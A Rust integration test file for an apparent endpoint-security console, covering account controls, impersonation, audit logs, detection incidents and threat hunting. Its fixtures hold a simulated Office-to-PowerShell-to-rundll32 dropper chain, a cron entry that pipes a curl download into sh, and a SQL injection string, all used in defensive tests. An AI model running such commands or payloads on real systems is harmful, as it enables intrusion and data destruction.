    insert_user(&pool, "u-role", "demoted", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "demoted").await;
    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert!(status.is_success());

    let admin = admin_token("admin");
    let change = serde_json::json!({ "role": "user" });
    let (status, account) = call(&app, "PATCH", "/api/admin/users/u-role", Some(&admin), Some(change.clone())).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(account["role"], "user");

    let (status, _) = call(&app, "POST", "/api/admin/installers/generate", Some(&session), Some(serde_json::json!({}))).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "the open session is read-only from the next request");
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&session), None).await;
    assert_eq!(status, StatusCode::OK);

    call(&app, "PATCH", "/api/admin/users/u-role", Some(&admin), Some(change)).await;
    let detail: Vec<String> = sqlx::query_scalar("SELECT detail FROM audit_log WHERE action = 'user.role_change'").fetch_all(&pool).await.unwrap();
    assert_eq!(detail.len(), 1, "repeating the same role writes no second entry");
    assert!(detail[0].contains("\"from\":\"admin\"") && detail[0].contains("\"to\":\"user\""));
}

#[tokio::test]
async fn test_sign_out_everywhere_and_a_password_reset_end_open_sessions() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-out", "roamer", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");

    let first = session_of(&app, "roamer").await;
    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/sign-out", Some(&admin), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&first), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let second = session_of(&app, "roamer").await;
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&second), None).await;
    assert_eq!(status, StatusCode::OK, "a new sign-in works after signing out everywhere");

    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/password", Some(&admin), Some(serde_json::json!({ "password": "short" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "POST", "/api/admin/users/u-out/password", Some(&admin), Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&second), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "roamer", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "roamer", "New-Horse-Battery-7").await;
    assert_eq!(status, StatusCode::OK);

    let actions = audit_actions(&pool).await;
    assert!(actions.contains(&"user.sign_out".to_string()) && actions.contains(&"user.password_reset".to_string()));
}

#[tokio::test]
async fn test_an_admin_changes_their_own_password_only_with_the_current_one() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-self", "owner", ACCOUNT_PASSWORD, "admin").await;
    let session = session_of(&app, "owner").await;
    let uri = "/api/admin/users/u-self/password";

    let (status, _) = call(&app, "POST", uri, Some(&session), Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let wrong = serde_json::json!({ "password": "New-Horse-Battery-7", "current_password": "Wrong-Horse-9" });
    let (status, _) = call(&app, "POST", uri, Some(&session), Some(wrong)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = sign_in(&app, "owner", ACCOUNT_PASSWORD).await;
    assert_eq!(status, StatusCode::OK, "a refused change leaves the password alone");

    let right = serde_json::json!({ "password": "New-Horse-Battery-7", "current_password": ACCOUNT_PASSWORD });
    let (status, _) = call(&app, "POST", uri, Some(&session), Some(right)).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (status, _) = sign_in(&app, "owner", "New-Horse-Battery-7").await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn test_account_controls_refuse_your_own_account_bad_input_and_the_read_only_role() {
    let app = create_test_app().await;
    let admin = admin_token("admin");

    for change in [serde_json::json!({ "disabled": true }), serde_json::json!({ "role": "user" })] {
        let (status, _) = call(&app, "PATCH", "/api/admin/users/user-1", Some(&admin), Some(change)).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "an admin cannot demote or disable their own account");
    }
    let (status, _) = call(&app, "POST", "/api/admin/users/user-1/mfa/reset", Some(&admin), None).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "PATCH", "/api/admin/users/user-2", Some(&admin), Some(serde_json::json!({ "role": "owner" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (status, _) = call(&app, "PATCH", "/api/admin/users/missing", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    for uri in ["/api/admin/users/missing/sign-out", "/api/admin/users/missing/mfa/reset"] {
        let (status, _) = call(&app, "POST", uri, Some(&admin), None).await;
        assert_eq!(status, StatusCode::NOT_FOUND);
    }

    let reader = admin_token("user");
    let refused = [
        ("PATCH", "/api/admin/users/user-1", Some(serde_json::json!({ "disabled": true }))),
        ("POST", "/api/admin/users/user-1/password", Some(serde_json::json!({ "password": "New-Horse-Battery-7" }))),
        ("POST", "/api/admin/users/user-1/mfa/reset", None),
        ("POST", "/api/admin/users/user-1/sign-out", None),
        ("POST", "/api/admin/users/user-1/impersonate", None),
    ];
    for (method, uri, body) in refused {
        let (status, _) = call(&app, method, uri, Some(&reader), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} must need the admin role", method, uri);
    }
}

#[tokio::test]
async fn test_resetting_a_second_factor_lets_the_account_sign_in_with_its_password() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-lost", "lostphone", ACCOUNT_PASSWORD, "user").await;
    sqlx::query("UPDATE users SET mfa_enabled = 1, mfa_secret = 'JBSWY3DPEHPK3PXP' WHERE id = 'u-lost'").execute(&pool).await.unwrap();
    sqlx::query("INSERT INTO mfa_recovery_codes (user_id, code_hash) VALUES ('u-lost', 'hash')").execute(&pool).await.unwrap();

    let (_, login) = sign_in(&app, "lostphone", ACCOUNT_PASSWORD).await;
    assert_eq!(login["mfa_required"], true);
    assert!(login["token"].is_null());

    let (status, _) = call(&app, "POST", "/api/admin/users/u-lost/mfa/reset", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (_, login) = sign_in(&app, "lostphone", ACCOUNT_PASSWORD).await;
    assert_eq!(login["mfa_required"], false);
    assert!(login["token"].is_string());
    let codes: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM mfa_recovery_codes WHERE user_id = 'u-lost'").fetch_one(&pool).await.unwrap();
    assert_eq!(codes, 0);
    assert!(audit_actions(&pool).await.contains(&"user.mfa_reset".to_string()));
}

async fn impersonate(app: &axum::Router, admin: &str, target: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", &format!("/api/admin/users/{}/impersonate", target), Some(admin), None).await
}

#[tokio::test]
async fn test_impersonation_has_the_rights_of_the_other_role_and_records_the_real_admin() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");

    let (status, issued) = impersonate(&app, &admin, "user-2").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(issued["username"], "reader");
    assert_eq!(issued["role"], "user");
    let token = issued["token"].as_str().unwrap().to_string();
    let lifetime = issued["expires_at"].as_i64().unwrap() - chrono::Utc::now().timestamp();
    assert!((29 * 60..=30 * 60).contains(&lifetime), "impersonation lasts thirty minutes, got {} seconds", lifetime);

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);
    let beyond_the_role = [
        ("GET", "/api/admin/users", None),
        ("GET", "/api/admin/audit", None),
        ("POST", "/api/admin/installers/generate", Some(serde_json::json!({}))),
        ("POST", "/api/admin/users/user-1/impersonate", None),
        ("POST", "/api/admin/users/user-2/sign-out", None),
    ];
    for (method, uri, body) in beyond_the_role {
        let (status, _) = call(&app, method, uri, Some(&token), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} is beyond the impersonated role", method, uri);
    }

    let (status, key) = call(&app, "POST", "/api/admin/api-keys", Some(&token), Some(serde_json::json!({ "name": "made while impersonating" }))).await;
    assert!(status.is_success(), "what the role may do, the impersonation may do");
    let owner: String = sqlx::query_scalar("SELECT user_id FROM api_keys WHERE id = ?").bind(key["id"].as_str().unwrap()).fetch_one(&pool).await.unwrap();
    assert_eq!(owner, "user-2");

    let entries: Vec<(String, String, String, String)> =
        sqlx::query_as("SELECT action, actor, actor_id, detail FROM audit_log ORDER BY seq").fetch_all(&pool).await.unwrap();
    let recorded: Vec<(&str, &str, &str)> = entries.iter().map(|entry| (entry.0.as_str(), entry.1.as_str(), entry.2.as_str())).collect();
    assert_eq!(recorded, vec![("user.impersonate", "tester", "user-1"), ("api_key.create", "tester", "user-1")]);
    assert!(entries[0].3.contains("reader"));
    assert!(entries[1].3.contains("\"as\":\"reader\""), "the entry names the account it was done as: {}", entries[1].3);
}

#[tokio::test]
async fn test_impersonation_is_refused_for_admins_yourself_and_disabled_accounts() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-peer", "peer", ACCOUNT_PASSWORD, "admin").await;
    insert_user(&pool, "u-idle", "idle", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");
    call(&app, "PATCH", "/api/admin/users/u-idle", Some(&admin), Some(serde_json::json!({ "disabled": true }))).await;

    for target in ["user-1", "u-peer", "u-idle"] {
        let (status, _) = impersonate(&app, &admin, target).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{} cannot be impersonated", target);
    }
    let (status, _) = impersonate(&app, &admin, "missing").await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = impersonate(&app, &admin_token("user"), "user-2").await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM audit_log WHERE action = 'user.impersonate'").fetch_one(&pool).await.unwrap();
    assert_eq!(recorded, 0, "a refused impersonation is not recorded as one");
}

#[tokio::test]
async fn test_impersonation_ends_with_either_account() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-boss", "boss", ACCOUNT_PASSWORD, "admin").await;
    let boss = session_of(&app, "boss").await;
    let admin = admin_token("admin");
    let open = |token: String| {
        let app = app.clone();
        async move { call(&app, "GET", "/api/admin/agents", Some(&token), None).await.0 }
    };
    let start = || async { impersonate(&app, &boss, "user-2").await.1["token"].as_str().unwrap().to_string() };

    let token = start().await;
    assert_eq!(open(token.clone()).await, StatusCode::OK);
    call(&app, "POST", "/api/admin/users/user-2/sign-out", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "signing the shown account out ends it");

    let token = start().await;
    call(&app, "PATCH", "/api/admin/users/u-boss", Some(&admin), Some(serde_json::json!({ "role": "user" }))).await;
    assert_eq!(open(token.clone()).await, StatusCode::UNAUTHORIZED, "it ends when the impersonator stops being an admin");
    call(&app, "PATCH", "/api/admin/users/u-boss", Some(&admin), Some(serde_json::json!({ "role": "admin" }))).await;
    assert_eq!(open(token.clone()).await, StatusCode::OK);

    call(&app, "POST", "/api/admin/users/u-boss/sign-out", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "signing the impersonator out ends it");

    let boss = session_of(&app, "boss").await;
    let token = impersonate(&app, &boss, "user-2").await.1["token"].as_str().unwrap().to_string();
    call(&app, "DELETE", "/api/admin/users/u-boss", Some(&admin), None).await;
    assert_eq!(open(token).await, StatusCode::UNAUTHORIZED, "deleting the impersonator ends it");
}

#[tokio::test]
async fn test_the_last_sign_in_is_recorded() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-seen", "regular", ACCOUNT_PASSWORD, "user").await;
    let admin = admin_token("admin");
    let last_sign_in = |users: &serde_json::Value| {
        users.as_array().unwrap().iter().find(|user| user["id"] == "u-seen").unwrap()["last_login_at"].clone()
    };

    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_null());

    sign_in(&app, "regular", "Wrong-Horse-9").await;
    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_null(), "a failed sign-in is not a sign-in");

    session_of(&app, "regular").await;
    let (_, users) = call(&app, "GET", "/api/admin/users", Some(&admin), None).await;
    assert!(last_sign_in(&users).is_i64());
}

fn started(timestamp: u64, pid: u32, ppid: u32, path: &str, args: &[&str]) -> serde_json::Value {
    let mut command_line = vec![path.to_string()];
    command_line.extend(args.iter().map(|arg| arg.to_string()));
    serde_json::json!({ "Process": {
        "timestamp": timestamp, "pid": pid, "ppid": ppid, "executable_path": path,
        "command_line": command_line, "action": "Create", "uid": 1001, "hash": null
    } })
}

fn connected(timestamp: u64, pid: u32, port: u16) -> serde_json::Value {
    serde_json::json!({ "Network": {
        "timestamp": timestamp, "pid": pid, "process_path": "", "protocol": "tcp", "source_ip": "10.0.0.5", "source_port": 50123,
        "dest_ip": "203.0.113.47", "dest_port": port, "action": "Connect", "bytes_sent": 1200, "bytes_received": 184000
    } })
}

fn dropper_chain() -> serde_json::Value {
    serde_json::json!([
        started(100, 2596, 2568, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", &[]),
        started(200, 2600, 2596, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", &["-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"]),
        connected(203, 2600, 443),
        { "File": { "timestamp": 205, "path": "C:\\Users\\Public\\update.dll", "action": "Write", "pid": 2600, "process_path": "", "hash": null } },
        started(208, 2604, 2600, "C:\\Windows\\System32\\rundll32.exe", &["C:\\Users\\Public\\update.dll,Start"]),
        connected(212, 2604, 8443),
    ])
}

async fn ingest(app: &axum::Router, agent: &mut TestAgent, events: serde_json::Value) -> StatusCode {
    let body = agent.batch(events);
    send_signed(app, agent, "/api/events", body).await.0
}

async fn detection_incidents(pool: &SqlitePool, agent_id: &str) -> Vec<String> {
    let mut types = open_incidents(pool, agent_id).await;
    types.retain(|incident_type| incident_type.starts_with("detection."));
    types.sort();
    types
}

#[tokio::test]
async fn test_a_dropper_chain_opens_detection_incidents_with_evidence() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "dropper-host").await;

    assert_eq!(ingest(&app, &mut agent, dropper_chain()).await, StatusCode::OK);

    assert_eq!(
        detection_incidents(&pool, "dropper-host").await,
        vec![
            "detection.drops-executable",
            "detection.encoded-command",
            "detection.office-child",
            "detection.proxy-loads-writable",
            "detection.proxy-network",
        ]
    );

    let recorded: Vec<String> = sqlx::query_scalar("SELECT data FROM events WHERE agent_id = 'dropper-host' AND event_type = 'detection' ORDER BY rowid")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(recorded.len(), 7, "the two medium findings are recorded as events without an incident");
    assert!(recorded.iter().any(|data| data.contains("\"rule\":\"hidden-window\"") && data.contains("\"level\":\"medium\"")));

    let evidence: String = sqlx::query_scalar("SELECT evidence FROM incidents WHERE agent_id = 'dropper-host' AND incident_type = 'detection.office-child'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let evidence: serde_json::Value = serde_json::from_str(&evidence).unwrap();
    assert_eq!(evidence["technique"], "T1204.002");
    assert_eq!(evidence["parent"], "winword.exe");
    assert_eq!(evidence["pid"], 2600);
    assert!(evidence["command"].as_str().unwrap().contains("-enc"));

    let (_, listed) = call(&app, "GET", "/api/admin/incidents?open=true", Some(&admin_token("user")), None).await;
    assert_eq!(listed.as_array().unwrap().iter().filter(|incident| incident["agent_id"] == "dropper-host").count(), 5);
}

#[tokio::test]
async fn test_ordinary_activity_and_a_resent_process_list_open_nothing_new() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "quiet-host").await;

    let ordinary = serde_json::json!([
        started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
        started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
        started(120, 708, 704, "C:\\Program Files\\nodejs\\node.exe", &["install.js"]),
        connected(121, 708, 443),
        started(130, 712, 700, "C:\\Python312\\python.exe", &["worker.py"]),
        connected(131, 712, 5432),
    ]);
    ingest(&app, &mut agent, ordinary).await;
    assert!(detection_incidents(&pool, "quiet-host").await.is_empty());
    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = 'quiet-host' AND event_type = 'detection'").fetch_one(&pool).await.unwrap();
    assert_eq!(recorded, 0);

    ingest(&app, &mut agent, dropper_chain()).await;
    ingest(&app, &mut agent, dropper_chain()).await;
    let recorded: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM events WHERE agent_id = 'quiet-host' AND event_type = 'detection'").fetch_one(&pool).await.unwrap();
    assert_eq!(recorded, 7, "a process list sent again does not repeat its findings");
    let opened: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM incidents WHERE agent_id = 'quiet-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(opened, 5);
}

#[tokio::test]
async fn test_an_admin_closes_an_incident_and_it_is_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "triaged-host").await;
    ingest(&app, &mut agent, dropper_chain()).await;
    let id: String = sqlx::query_scalar("SELECT id FROM incidents WHERE agent_id = 'triaged-host' AND incident_type = 'detection.proxy-network'")
        .fetch_one(&pool)
        .await
        .unwrap();
    let uri = format!("/api/admin/incidents/{}/close", id);

    let (status, _) = call(&app, "POST", &uri, Some(&admin_token("user")), None).await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    let (status, closed) = call(&app, "POST", &uri, Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(closed["closed_at"].is_i64());
    assert!(!detection_incidents(&pool, "triaged-host").await.contains(&"detection.proxy-network".to_string()));

    let (status, _) = call(&app, "POST", &uri, Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "an incident closes once");
    let (status, _) = call(&app, "POST", "/api/admin/incidents/missing/close", Some(&admin_token("admin")), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    let entry: (String, String, String) = sqlx::query_as("SELECT actor, target, detail FROM audit_log WHERE action = 'incident.close'").fetch_one(&pool).await.unwrap();
    assert_eq!((entry.0.as_str(), entry.1.as_str()), ("tester", id.as_str()));
    assert!(entry.2.contains("detection.proxy-network"));
    let event: String = sqlx::query_scalar("SELECT data FROM events WHERE event_type = 'incident_closed' AND agent_id = 'triaged-host'").fetch_one(&pool).await.unwrap();
    assert!(event.contains("\"closed_by\":\"tester\""));
}

async fn hunt(app: &axum::Router, token: Option<&str>, query: &str) -> (StatusCode, serde_json::Value) {
    call(app, "POST", "/api/admin/hunt", token, Some(serde_json::json!({ "query": query }))).await
}

async fn hunt_total(app: &axum::Router, query: &str) -> i64 {
    let (status, result) = hunt(app, Some(&admin_token("user")), query).await;
    assert_eq!(status, StatusCode::OK, "{} -> {}", query, result);
    result["total"].as_i64().unwrap()
}

#[tokio::test]
async fn test_hunting_finds_a_process_tree_shape_on_every_endpoint_that_has_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut first = enroll(&app, &pool, "hunt-a").await;
    let mut second = enroll(&app, &pool, "hunt-b").await;
    let mut clean = enroll(&app, &pool, "hunt-clean").await;
    ingest(&app, &mut first, dropper_chain()).await;
    ingest(&app, &mut second, dropper_chain()).await;
    let ordinary = serde_json::json!([
        started(100, 700, 600, "C:\\BuildAgent\\bin\\buildagent.exe", &[]),
        started(110, 704, 700, "C:\\Windows\\System32\\cmd.exe", &["/c", "npm", "ci"]),
    ]);
    ingest(&app, &mut clean, ordinary).await;

    let reader = admin_token("user");
    let shape = r#"process where name = "rundll32.exe" and parent.name = powershell.exe and grandparent.name = WINWORD.EXE"#;
    let (status, result) = hunt(&app, Some(&reader), shape).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(result["entity"], "process");
    assert_eq!(result["total"], 2);
    let mut endpoints: Vec<(&str, i64)> = result["endpoints"]
        .as_array()
        .unwrap()
        .iter()
        .map(|endpoint| (endpoint["agent_id"].as_str().unwrap(), endpoint["matches"].as_i64().unwrap()))
        .collect();
    endpoints.sort();
    assert_eq!(endpoints, vec![("hunt-a", 1), ("hunt-b", 1)]);
    let row = &result["rows"][0];
    assert_eq!(row["process"], "2604@208", "a row carries the key of its process, so the console can open it");
    assert_eq!(row["cells"][0], "rundll32.exe");
    assert_eq!(row["cells"][1], "powershell.exe");
    assert!(row["cells"][2].as_str().unwrap().contains("update.dll,Start"));

    assert_eq!(hunt_total(&app, r#"connection where dest.ip = "203.0.113.47" and process.name in (rundll32.exe, powershell.exe)"#).await, 4);
    assert_eq!(hunt_total(&app, "connection where dest.port = 8443 and host = test-host").await, 2);
    assert_eq!(hunt_total(&app, r#"file where path ~ "\users\public" and process.name = powershell.exe"#).await, 2);
    assert_eq!(hunt_total(&app, "detection where level = high").await, 10);
    assert_eq!(hunt_total(&app, "detection where rule = hidden-window or rule = shell-network").await, 4);
    assert_eq!(hunt_total(&app, "process where command ~ npm").await, 1);
    assert_eq!(hunt_total(&app, "process where name = cmd.exe and not parent.name = buildagent.exe").await, 0);
    assert_eq!(hunt_total(&app, "process where pid >= 2600 and pid < 2700").await, 4);

    let (status, _) = hunt(&app, None, shape).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let (status, fields) = call(&app, "GET", "/api/admin/hunt/fields", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let process = fields.as_array().unwrap().iter().find(|entity| entity["name"] == "process").unwrap();
    for field in ["name", "parent.name", "grandparent.name", "running", "host"] {
        assert!(process["fields"].as_array().unwrap().iter().any(|listed| listed == field), "process lists {}", field);
    }
}

#[tokio::test]
async fn test_a_hunt_query_that_cannot_be_read_says_why_and_runs_nothing() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "hunt-safe").await;
    ingest(&app, &mut agent, dropper_chain()).await;
    let reader = admin_token("user");

    let (status, refused) = hunt(&app, Some(&reader), "process name = a").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert_eq!(refused["error"], "Expected where after the kind of record");
    assert_eq!(refused["column"], 9);

    let (status, refused) = hunt(&app, Some(&reader), "process where parent.nam = a").await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(refused["error"].as_str().unwrap().contains("Fields: name, path, command"));

    let injection = r#"process where name = "x' OR 1=1; DELETE FROM agents; --""#;
    assert_eq!(hunt_total(&app, injection).await, 0);
    let agents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agents").fetch_one(&pool).await.unwrap();
    assert_eq!(agents, 1, "a value is only ever a value");
}

#[tokio::test]
async fn test_hunting_knows_which_processes_have_ended() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "hunt-ended").await;
    let ended = serde_json::json!({ "Process": {
        "timestamp": 900, "pid": 41, "ppid": 0, "executable_path": "", "command_line": [], "action": "Terminate", "uid": 0, "hash": null
    } });
    ingest(&app, &mut agent, serde_json::json!([started(800, 41, 1, "/usr/bin/curl", &["-s", "http://203.0.113.9/a"]), started(810, 42, 1, "/usr/bin/sleep", &["60"]), ended])).await;

    assert_eq!(hunt_total(&app, "process where name = curl and running = false").await, 1);
    assert_eq!(hunt_total(&app, "process where name = curl and running = true").await, 0);
    assert_eq!(hunt_total(&app, "process where running = true").await, 1);
}

fn packages(events: &[serde_json::Value]) -> serde_json::Value {
    serde_json::json!(events.iter().map(|event| serde_json::json!({ "Package": event })).collect::<Vec<_>>())
}

#[tokio::test]
async fn test_hunting_finds_every_endpoint_with_an_old_version_of_a_package() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut old = enroll(&app, &pool, "package-old").await;
    let mut patched = enroll(&app, &pool, "package-patched").await;
    let mut alpine = enroll(&app, &pool, "package-alpine").await;
    ingest(&app, &mut old, packages(&[
        package_event("Present", "dpkg", "openssl", "3.0.13-0ubuntu3", None),
        package_event("Present", "dpkg", "bash", "5.2.21-2ubuntu4", None),
    ])).await;
    ingest(&app, &mut patched, packages(&[package_event("Present", "dpkg", "openssl", "3.0.14-1", None)])).await;
    ingest(&app, &mut alpine, packages(&[package_event("Present", "apk", "openssl", "3.0.9-r1", None)])).await;

    let (status, result) = hunt(&app, Some(&admin_token("user")), "package where name = openssl and version < 3.0.14").await;
    assert_eq!(status, StatusCode::OK, "{}", result);
    let mut hosts: Vec<&str> = result["endpoints"].as_array().unwrap().iter().map(|endpoint| endpoint["agent_id"].as_str().unwrap()).collect();
    hosts.sort_unstable();
    assert_eq!(hosts, ["package-alpine", "package-old"], "3.0.9 is older than 3.0.14 although it sorts after it as text");
    assert_eq!(result["columns"], serde_json::json!(["package", "version", "was", "manager", "arch"]));

    assert_eq!(hunt_total(&app, "package where name = openssl and version >= 3.0.14").await, 1);
    assert_eq!(hunt_total(&app, "package where name = openssl and manager = apk").await, 1);
    assert_eq!(hunt_total(&app, "package where name = openssl").await, 3);

    ingest(&app, &mut old, packages(&[package_event("Changed", "dpkg", "openssl", "3.0.14-0ubuntu1", Some("3.0.13-0ubuntu3"))])).await;
    assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 1, "an upgrade replaces the version it had");
    assert_eq!(hunt_total(&app, r#"package where previous = "3.0.13-0ubuntu3""#).await, 1);

    ingest(&app, &mut alpine, packages(&[package_event("Removed", "apk", "openssl", "3.0.9-r1", None)])).await;
    assert_eq!(hunt_total(&app, "package where name = openssl and version < 3.0.14").await, 0, "a removed package is no longer installed");
    assert_eq!(hunt_total(&app, "package where name = openssl").await, 2);
}

#[tokio::test]
async fn test_hunting_reads_the_persistence_items_an_endpoint_has_now() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "persistence-hunt").await;
    let cron = |action: &str| serde_json::json!({ "Persistence": persistence_event(action, "cron", "fetch", "/etc/cron.d/fetch", "curl -s http://203.0.113.9/x | sh", None) });
    let unit = serde_json::json!({ "Persistence": persistence_event("Present", "systemd_unit", "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None) });
    ingest(&app, &mut agent, serde_json::json!([cron("Added"), unit])).await;

    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl").await, 1);
    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 2);
    assert_eq!(hunt_total(&app, "persistence where kind in (systemd_unit, systemd_timer) and user = root").await, 1);

    ingest(&app, &mut agent, serde_json::json!([cron("Changed")])).await;
    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 1, "a changed item is the same item");

    ingest(&app, &mut agent, serde_json::json!([cron("Removed")])).await;
    assert_eq!(hunt_total(&app, "persistence where kind = cron").await, 0);
    assert_eq!(hunt_total(&app, "persistence where enabled = true").await, 1, "the unit is still there");
}

#[tokio::test]
async fn test_event_histogram_counts_each_type_per_bucket_and_events_can_be_cut_to_a_period() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut first = enroll(&app, &pool, "histogram-a").await;
    let mut second = enroll(&app, &pool, "histogram-b").await;
    let seen = serde_json::json!([
        started(1000, 10, 1, "/usr/bin/a", &[]),
        started(1005, 11, 1, "/usr/bin/b", &[]),
        started(1065, 12, 1, "/usr/bin/c", &[]),
        connected(1070, 12, 443),
        started(1200, 13, 1, "/usr/bin/d", &[]),
    ]);
    ingest(&app, &mut first, seen).await;
    ingest(&app, &mut second, serde_json::json!([started(1010, 20, 1, "/usr/bin/e", &[])])).await;
    let reader = admin_token("user");
    let counts = |histogram: &serde_json::Value, event_type: &str| {
        histogram["series"].as_array().unwrap().iter().find(|series| series["event_type"] == event_type).map(|series| series["counts"].clone())
    };

    let (status, everyone) = call(&app, "GET", "/api/admin/events/histogram?from=1000&to=1120&buckets=2", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(everyone["bucket_seconds"], 60);
    assert_eq!(everyone["buckets"], 2);
    assert_eq!(counts(&everyone, "process"), Some(serde_json::json!([3, 1])));
    assert_eq!(counts(&everyone, "network"), Some(serde_json::json!([0, 1])), "a type is zero where it has nothing");

    let uri = format!("/api/admin/events/histogram?from=1000&to=1120&buckets=2&agent_id={}", first.id);
    let (_, one) = call(&app, "GET", &uri, Some(&reader), None).await;
    assert_eq!(counts(&one, "process"), Some(serde_json::json!([2, 1])));

    let (_, uneven) = call(&app, "GET", "/api/admin/events/histogram?from=1000&to=1100&buckets=3", Some(&reader), None).await;
    assert_eq!(uneven["bucket_seconds"], 34, "buckets round up to whole seconds");
    assert_eq!(counts(&uneven, "process"), Some(serde_json::json!([3, 1, 0])));

    for range in ["from=1120&to=1000", "from=1000&to=1000", "from=0&to=99999999999"] {
        let (status, _) = call(&app, "GET", &format!("/api/admin/events/histogram?{}", range), Some(&reader), None).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{}", range);
    }

    let (status, cut) = call(&app, "GET", "/api/admin/events?event_types=process&from=1060&to=1100", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let times: Vec<i64> = cut.as_array().unwrap().iter().map(|event| event["timestamp"].as_i64().unwrap()).collect();
    assert_eq!(times, vec![1065]);
}

#[tokio::test]
async fn test_event_histogram_shows_console_activity_to_admins_only() {
    let (app, _pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");
